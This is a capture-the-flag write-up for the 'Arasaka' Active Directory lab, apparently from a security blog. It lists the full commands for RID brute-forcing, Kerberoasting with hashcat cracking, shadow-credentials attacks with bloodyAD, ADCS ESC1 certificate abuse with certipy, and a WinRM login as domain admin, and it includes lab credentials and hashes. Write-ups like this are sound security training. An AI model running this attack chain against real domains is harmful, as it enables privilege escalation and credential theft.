---
title: "Arasaka HackSmarter" 
date: 2026-3-23 5:30:00 0000+
tags: [WriteUp, Arasaka, HS, Enumeration, Active Directory, RID Bruteforcing, ShadowCredentials, Kerberoasting, ADCS, Hash Cracking, Lateral Movement, Bloodhound, SMB, bloodyAD, Privilege Escalation, Windows]
categories: [WriteUps, HackSmarter]
image:
  path: /assets/images/Arasaka_HS/image.png
---
# Arasaka HackSmarter

`Arasaka` is an easy active directory box which focuses on an assumed breach scenario in which we already own a user in a domain. After some enumeration it is revealed that a `kerberoastable` user is present inside the domain which through lateral movement leads us to a an account which can perform `ADCS` `ESC1` on the domain using `vulnerable templates`, this gaves us the hash of the domain admin user allowing us to pwn the full domain.

![image.png](/assets/images/Arasaka_HS/image.png)

## Initial Enumeration

NOTE- Since this is an assumed breach scenario, initial credentials are given to us. `faraday:hacksmarter123`

Starting with nmap to find the open ports and services running on the box.

```bash
rustmap.py -ip 10.0.28.240
```

![image.png](/assets/images/Arasaka_HS/image%201.png)

![image.png](/assets/images/Arasaka_HS/image%202.png)

Identified that the DC01 is the domain controller name and the domain is `hacksmarter.local`

### SMB Enumeration

Since we have creds doing some SMB enumeration to see if we can find something on shares.

```bash
nxc smb dc01.hacksmarter.local -u 'faraday' -p 'hacksmarter123' --shares
```

![image.png](/assets/images/Arasaka_HS/image%203.png)

No new share found in smb, lets get all the users on the domain using `RID-BRUTEFORCING` attack.

### RID Bruteforcing

Lets do some `RID bruteforcing` with netexec.

```bash
nxc smb dc01.hacksmarter.local -u 'faraday' -p 'hacksmarter123' --rid-brute
```

![image.png](/assets/images/Arasaka_HS/image%204.png)

Saved them into a file users.txt

lets gather some bloodhound data first.

### Bloodhound

Using bloodhound to gather bloodhound data.

```bash
rusthound-ce --domain hacksmarter.local -i 10.0.28.240 -u 'faraday' -p 'hacksmarter123' -z
```

![image.png](/assets/images/Arasaka_HS/image%205.png)

Analysing this data in bloodhound we have this.

![image.png](/assets/images/Arasaka_HS/image%206.png)

But `faraday` dont have permissions to be able to review templates on DC using CA.

## Exploitation

### Kerberoasting

Checking for the kerberoastable users on the box we have this.

![image.png](/assets/images/Arasaka_HS/image%207.png)

We have a SPN set on this `ALT.SVC` user, kerberoasting it using netexec.

```bash
nxc ldap dc01.hacksmarter.local -u 'faraday' -p 'hacksmarter123' --kerberoasting kerberoastable.txt --kdcHost 10.0.28.240
```

![image.png](/assets/images/Arasaka_HS/image%208.png)

Cracking this hash using hashcat.

```bash
hashcat -m 13100 kerberoastable.txt /usr/share/wordlists/rockyou.txt 
```

![image.png](/assets/images/Arasaka_HS/image%209.png)

From bloodhound we have this path !

![image.png](/assets/images/Arasaka_HS/image%2010.png)

### Alt-svc → Yorinobu

As `Alt-svc` we have `genericAll` on `Yorinobu` Exploiting this using `bloodyAD` shadow credentials attack.

```bash
bloodyAD -d hacksmarter.local -i 10.0.28.240 -u 'alt.svc' -p 'babygirl1' add shadowCredentials 'Yorinobu'
```

![image.png](/assets/images/Arasaka_HS/image%2011.png)

we now own `yorinobu` marking him as owned in bloodhound.

### Yorinobu → Soulkiller.svc

As `yorinobu` we have `genericWrite` over `Soulkiller.svc`, using bloodyAD to perform a `shadowCredentials` attack on it.

```bash
bloodyAD -d hacksmarter.local -i 10.0.28.240 -u 'Yorinobu' -p ':5d21eb21b243284ed2cd8d04ac187c0f' add shadowCredentials 'Soulkiller.svc'
```

![image.png](/assets/images/Arasaka_HS/image%2012.png)

Marking `yorinobu` as owned in bloodhound.

Now according to bloodhound `soulkiller.svc` can perform a `ESC1` attack on the DC.

### ESC1

Checking for `ESC1` using certipy.

```bash
certipy find -u 'soulkiller.svc' -hashes 'f4ab68f27303bcb4024650d8fc5f973a' -dc-ip '10.0.28.240' -target dc01.hacksmarter.local -vulnerable -text -enabled
```

![image.png](/assets/images/Arasaka_HS/image%2013.png)

Looking at the results we have this.

![image.png](/assets/images/Arasaka_HS/image%2014.png)

This confirms that this is vulnerable to `ESC1`

Lets exploit this using `certipy`

```bash
certipy req -u 'soulkiller.svc' -hashes 'f4ab68f27303bcb4024650d8fc5f973a' -dc-ip 10.0.28.240 -ca 'hacksmarter-DC01-CA' -template 'AI_Takeover' -upn 'Administrator@hacksmarter.local'
```

![image.png](/assets/images/Arasaka_HS/image%2015.png)

Authentication using `certipy`.

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip 10.0.28.240 -ns 10.0.28.240 -username administrator -domain hacksmarter.local
```

![image.png](/assets/images/Arasaka_HS/image%2016.png)

It failed with the `kerberos key error`.

Generating .PFX using another Domain Admin user `the_emperor`

```bash
certipy req -u 'soulkiller.svc' -hashes 'f4ab68f27303bcb4024650d8fc5f973a' -dc-ip 10.0.28.240 -ca 'hacksmarter-DC01-CA' -template 'AI_Takeover' -upn 'the_emperor@hacksmarter.local'
```

![image.png](/assets/images/Arasaka_HS/image%2017.png)

Authentication with the `the_emperor` user.

```bash
certipy auth -pfx 'the_emperor.pfx' -dc-ip 10.0.28.240 -ns 10.0.28.240 -username 'the_emperor' -domain 'hacksmarter.local'
```

![image.png](/assets/images/Arasaka_HS/image%2018.png)

We now have the domain admin account hash, lets `winrm` into the box.

### Evil Winrm

Using evil winrm.

![image.png](/assets/images/Arasaka_HS/image%2019.png)

```bash
python3 /opt/winrmexec/evil_winrmexec.py -dc-ip 10.0.28.240 -k dc01.hacksmarter.local
```

![image.png](/assets/images/Arasaka_HS/image%2020.png)

Claiming the root.txt from the administrator’s desktop.

![image.png](/assets/images/Arasaka_HS/image%2021.png)

Thanks for reading 🙂